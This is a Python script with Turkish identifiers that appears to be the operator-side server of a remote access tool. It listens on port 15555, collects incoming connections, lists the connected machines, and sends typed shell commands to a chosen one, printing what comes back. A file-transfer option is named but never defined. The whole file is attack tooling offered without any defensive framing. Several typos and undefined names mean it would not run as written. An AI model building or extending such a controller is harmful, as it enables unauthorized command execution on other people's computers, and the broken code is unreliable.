import socket
import threading 

host=""
port=15555
s=socket.socket() 

baglanti_listesi=[]
adres_listesi=[]


def bagla():
    try:
        s.bind((host,port))

        s.listen(5)

    except:
        print("Bağlantı hatası")
        bagla()

def kabul_et():

    while True:
        try:            
             baglanti,adres=s.accept()
             baglanti_listesi.append(baglanti)
             adresadres_listesi.append(adres)
        except:
            print("bağlantı hatası")

  

def ana_shell():
    while True:
        print("Lütfen komut giriniz")
        komut=input("komut: ")

        if komut == "1":
            sırala()
        elif "baglan" in komut:
            try:
                rakam=int(komut[-1])
                baglanti=baglan(rakam)

                if baglanti:
                    istek=input("Ne istiyorsunuz: ")

                    if istek=="cmd":
                        komut_yolla(baglanti)
                    elif istek=="dosya transferi":
                        dosya_transferi()
                    else:
                        print("geçersiz istek")

            except ValueError:
                print("lütfen sayı giriniz")
        else:
            print("geçersiz işlem...")





def sırala():
    for index, baglanti in enumarate(baglanti_listesi):
        try:
            baglanti.send(b" ")
            baglanti.recv(1024)
        except:
            baglanti_listesi.pop(index)
            adres_listesi.pop(index)
            continue


        print(str(index)+"      "+adres_listesi[index][0]+"     "+str(adres_listesi[index][1]))




def baglan(index):
    try:
        baglanti=baglanti_listesi[index]
        print(adres_listesi[0]+" ip adresine bağlandı...")
        return baglanti
    except:
        print("geçersiz baglantı")
        return False



def komut_yolla(baglanti):
    while True:
        cmd=input("What's your code?")

        if cmd=="quit":
            baglanti.send("a".encode("utf-8"))
            break

        if len(cmd)>0:
            baglanti.send(cmd.encode("utf-8"))

            cevap=baglanti.recv(4096).decode("utf-8")

            print(cevap)




bagla()

shell=threading.Thread(target=ana_shell)
kabul=threading.Thread(target=kabul_et)

shell.start()
kabul.start()
